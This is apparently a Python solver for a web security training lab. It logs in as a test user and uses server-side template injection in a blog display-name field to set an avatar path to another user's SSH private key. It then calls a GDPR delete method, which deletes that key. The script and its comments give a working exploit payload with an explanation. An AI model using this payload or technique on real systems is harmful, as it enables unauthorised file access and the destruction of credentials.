from web_security_academy.core.logger import logger


def solve_lab(session):
    session.login("wiener", "peter")

    # Explanation: When attempting to upload a non-image file as the user's avatar, the subsequent
    # error message reveals the function User->setAvatar($filename, $mimetype) in the file
    # /home/carlos/User.php. It turns out that setAvatar doesn't validate the contents of
    # $filename, only the $mimetype. Therefore I could take advantage of the SSTI vulnerability to
    # set the user's avatar to /home/carlos/User.php. Then, I could visit /avatar?avatar=wiener to
    # get the contents of that file.

    # From reviewing the contents of User.php, I learned that the User class has a private function
    # User->rm($filename) that tries to delete the file given by $filename. I can't call it
    # directly since it's private, but there is a public function User->gdprDelete() which deletes
    # the file User->avatarLink, as well as the file User->avatarLink links to. User->avatarLink is
    # a symbolic link to the file that a user has uploaded for their avatar, and the link is set
    # whenever the user uploads a file for their avatar.

    # Therefore, my payload uses the method described above to set the user's avatar to
    # .ssh/id_rsa. Then, my payload calls User->gdprDelete(). This links User->avatarLink to
    # .ssh/id_rsa, meaning User->gdprDelete() will ultimately delete .ssh/id_rsa.

    payload = 'user.setAvatar("/home/carlos/.ssh/id_rsa", "image/png") }} {{ user.gdprDelete()'
    data = {
        "blog-post-author-display": payload,
        "csrf": session.get_csrf_token("/my-account", n=2),
    }
    session.post_path("/my-account/change-blog-post-author-display", data=data)

    logger.info(
        "Changed blog post author display (preferred name) using the following template:"
    )
    logger.info(payload)

    csrf = session.get_csrf_token("/post?postId=1")
    data = {"csrf": csrf, "postId": 1, "comment": "hello"}
    session.post_path("/post/comment", data=data)
    logger.info("Posted a comment on a blog post")

    session.get_path("/post?postId=1")
    logger.info("Visited said blog post")
